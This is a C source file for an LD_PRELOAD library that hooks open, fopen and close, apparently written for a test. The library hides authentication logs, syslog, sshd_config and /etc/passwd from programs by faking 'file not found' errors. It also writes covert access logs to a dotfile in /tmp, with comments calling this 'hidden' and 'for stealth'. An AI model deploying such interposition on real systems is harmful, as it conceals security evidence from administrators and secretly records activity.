// src/sandbox_preload.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <stdarg.h>     // For va_list, va_start, etc.

static int (*real_open)(const char *pathname, int flags, ...);
static FILE *(*real_fopen)(const char *pathname, const char *mode);
static int (*real_close)(int fd);
static int hook_count = 0;
static int inside_hook = 0;  // Reentrancy guard (shared for simplicity, since no threads in test)

// Log file (hidden)
#define LOG_FILE "/tmp/.syscache"

// Block specific files
static int should_block_file(const char *pathname) {
    const char *blocked[] = {
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/syslog",
        "/etc/ssh/sshd_config",
        "/etc/passwd",  // Added to match your test's "should be NULL"
        NULL
    };

    if (!pathname) return 0;

    for (int i = 0; blocked[i]; i++) {
        if (strstr(pathname, blocked[i])) {
            return 1;
        }
    }
    return 0;
}

// Hidden logging (uses fopen, but guard prevents recursion)
static void hidden_log(const char *pathname, int flags, int result) {
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) return;

    char flag_str[64] = "";
    if (flags & O_WRONLY) strcat(flag_str, " WRITE");
    if (flags & O_RDONLY) strcat(flag_str, " READ");
    if (flags & O_CREAT)  strcat(flag_str, " CREATE");

    fprintf(log, "[%d] open('%s'%s) = %d\n",
            getpid(), pathname ? pathname : "NULL", flag_str, result);
    fflush(log);
    fclose(log);
}

int open(const char *pathname, int flags, ...) {
    if (inside_hook) {
        // Recursion detected - fall back to real (rare, but safe)
        if (!real_open) return -1;  // Shouldn't happen
        mode_t mode = 0;
        va_list args;
        va_start(args, flags);
        if (flags & (O_CREAT | O_TMPFILE)) {
            mode = va_arg(args, mode_t);
        }
        va_end(args);
        return real_open(pathname, flags, mode);
    }

    inside_hook = 1;

    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
        if (!real_open) {
            inside_hook = 0;
            return -1;
        }
    }

    mode_t mode = 0;
    va_list args;
    va_start(args, flags);
    if (flags & (O_CREAT | O_TMPFILE)) {
        mode = va_arg(args, mode_t);
    }
    va_end(args);

    // Block sensitive files
    if (should_block_file(pathname)) {
        hidden_log(pathname, flags, -1);
        errno = ENOENT;
        inside_hook = 0;
        return -1;
    }

    int result = real_open(pathname, flags, mode);
    hook_count++;

    // Log only first 10 calls for stealth
    if (hook_count <= 10) {
        hidden_log(pathname, flags, result);
    }

    inside_hook = 0;
    return result;
}

FILE *fopen(const char *pathname, const char *mode) {
    if (inside_hook) {
        // Recursion - fall back
        if (!real_fopen) return NULL;
        return real_fopen(pathname, mode);
    }

    inside_hook = 1;

    if (!real_fopen) {
        real_fopen = dlsym(RTLD_NEXT, "fopen");
        if (!real_fopen) {
            inside_hook = 0;
            return NULL;
        }
    }

    if (should_block_file(pathname)) {
        hidden_log(pathname, 0, 0);
        errno = ENOENT;
        inside_hook = 0;
        return NULL;
    }

    FILE *result = real_fopen(pathname, mode);
    if (hook_count <= 10) {
        hidden_log(pathname, 0, (result != NULL ? 1 : 0));
    }

    inside_hook = 0;
    return result;
}

int close(int fd) {
    if (!real_close) {
        real_close = dlsym(RTLD_NEXT, "close");
        if (!real_close) return -1;
    }

    return real_close(fd);
}
